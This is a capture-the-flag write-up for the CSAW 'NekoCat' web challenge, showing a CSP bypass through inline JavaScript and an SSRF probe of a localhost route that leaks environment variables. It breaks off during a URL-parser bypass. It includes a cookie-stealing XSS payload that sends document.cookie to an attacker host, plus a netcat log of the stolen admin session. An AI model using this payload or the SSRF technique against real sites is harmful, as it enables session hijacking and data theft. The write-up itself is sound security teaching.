# NekoCat WEB 500 
![NikoCat](http://web.chal.csaw.io:1003/static/favicon.ico)
## Difficulty: ★★★★★

Link: http://web.chal.csaw.io:1003

# Idea

> * Bypass CSP by Abusing XSS Filter using inline
> * Escalate user permissions
> * Abusing URL Parser to read environment variables
> * Craft malicious session lead to RCE

# Walkthrough
description provide us the source code of the challenge 
[flagon.zip](https://ctf.csaw.io/files/a75d5b38afc3d477873e8ce01c468d85/flagon.zip)

we notice that challange uses Python Flask
so let's create account and try to see what's happen there 
http://web.chal.csaw.io:1003/register

![NikoCat](https://screenshotscdn.firefoxusercontent.com/images/ae6ec98e-8b7c-4909-9fc6-a2c6fe880bf5.png)

we try to post link but we can see only verfied users can preview link 

> app.py Line:152
```python
if verified_user(session, request.session.get('username'))[0]:
    preview = get_post_preview(link)
 ```
so the idea here is to get permession of verfied user in plateform
we can trigger an XSS attack to steal cookies from admin maybe
but when we dig more in the source code we see there is CSP rules implemented
> app.py Line:51
```python
def apply_csp(f):
    @wraps(f)
    def decorated_func(*args, **kwargs):
        resp = f(*args, **kwargs)
        csp = "; ".join([
                "default-src 'self' 'unsafe-inline'",
                "style-src " + " ".join(["'self'",
                                         "*.bootstrapcdn.com",
                                         "use.fontawesome.com"]),
                "font-src " + "use.fontawesome.com",
                "script-src " + " ".join(["'unsafe-inline'",
                                          "'self'",
                                          "cdnjs.cloudflare.com",
                                          "*.bootstrapcdn.com",
                                          "code.jquery.com"]),
                "connect-src " + "*"
              ])
        resp.headers["Content-Security-Policy"] = csp

        return resp
    return decorated_func
```
CSP is allowing javascript inline resources
so we can excute XSS in URL

![NikoCat](https://screenshotscdn.firefoxusercontent.com/images/e1458bad-b01f-4941-ba36-9c2ebb1e2020.png)

> but hold on xss triggred on when admin click on link

after another dig in plateform we noticed missing part 
> app.py Line:178
```python
@app.route('/report')
@apply_csp
def report(request):
    #: neko checks for naughtiness
    #: neko likes links
    pass
```
so there is feature that check links that reported , this the way how our admin checks the inline XSS link

let's craft and cookie grabber 
> [link]javascript:document.location="http://pwn.com:2128/"+document.cookie

and we listen for the request and report the link for being broken 
```
root@serveur [~]# nc -l 2128
GET /session_data=%22YWzU8XcjGIq5lmuao7nR65VW3yg=?name=gANYCAAAAE5la28gQ2F0cQAu&username=gANYDQAAAG1lb3dfYzdkM2M1MDhxAC4=%22 HTTP/1.1
Host: pwn.com:2128
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:5000/post?id=20762&instance=c7d3c508-1b2a-481e-a83e-5e3214938bc5
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

> Bingo we have the verfied user session so we can preview sites now 

![NikoCat](https://screenshotscdn.firefoxusercontent.com/images/0b810f23-03d8-4889-80da-559d79829b1f.png)

lets try to preview site 
> [link]http://www.google.com

it works

![NikoCat](https://screenshotscdn.firefoxusercontent.com/images/8b72962e-0868-4c32-8e89-e2442588fb7d.png)

we noticed from captured admin request that refrer is 

> Referer: http://127.0.0.1:5000/post?id=20762&instance=c7d3c508-1b2a-481e-a83e-5e3214938bc5

running on localhost 
and there is a route for reading environment variables called flaginfo

> flagon.py Line:65
```python
flaginfo_route = "/flaginfo"
        self.routes[flaginfo_route] = flagoninfo
        self.url_map.add(Rule(flaginfo_route, endpoint=flaginfo_route))
```

and the function flagoninfo()
> flagon.py Line:65
```python
def flagoninfo(request):
    if request.remote_addr != "127.0.0.1":
        return render_template("404.html")

    info = {
        "system": " ".join(os.uname()),
        "env": str(os.environ)
    }

    return render_template("flaginfo.html", info_dict=info)
```
it will be rendred if the ip adress accssed from is localhost
we have race condition here but we can use the url previewer to read it for us 

let's try 
> [link]http://127.0.0.1/flaginfo
and we got nothing ??? hmmmmmm

![NikoCat](https://screenshotscdn.firefoxusercontent.com/images/112077b8-4612-4b13-a12f-63e2d133757c.png)

after another dig in source we see that flaginfo is filtred 
> app.py Line:13
```python
def get_post_preview(url):
    scheme, netloc, path, query, fragment = url_parse(url)

    # No oranges allowed
    if scheme != 'http' and scheme != 'https':
        return None

    if '..' in path:
        return None

    if path.startswith('/flaginfo'):
        return None

    try:
        r = requests.get(url, allow_redirects=False)
    except Exception:
        return None

    soup = BeautifulSoup(r.text, 'html.parser')
    if soup.body:
        result = ''.join(soup.body.findAll(text=True)).strip()
        result = ' '.join(result.split())
        return result[:280]

    return None
```

we see this commented line 

> # No oranges allowed

and this one 
> scheme, netloc, path, query, fragment = url_parse(url)

so url been parsed , there is bug discovered by [Orange Tsai]https://twitter.com/orange_8361?lang=en
